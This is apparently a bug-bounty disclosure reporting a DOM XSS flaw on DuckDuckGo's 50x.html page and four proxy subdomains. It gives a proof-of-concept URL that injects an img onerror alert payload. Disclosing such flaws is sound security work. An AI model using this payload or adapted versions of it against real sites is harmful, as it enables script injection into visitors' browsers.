Summary:

Hi,

I read the report about DOM XSS on 50x.html page (https://hackerone.com/reports/405191).
I decided to check some other subdomains to be sure.
This link still executes javascript:
https://proxy.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

The following subdomains execute javascript as well:
proxy1.duckduckgo.com
proxy2.duckduckgo.com
proxy3.duckduckgo.com
proxy4.duckduckgo.com

@cujanovic: I'm sorry for stealing.

## Impact

The attacker can execute javascript code.
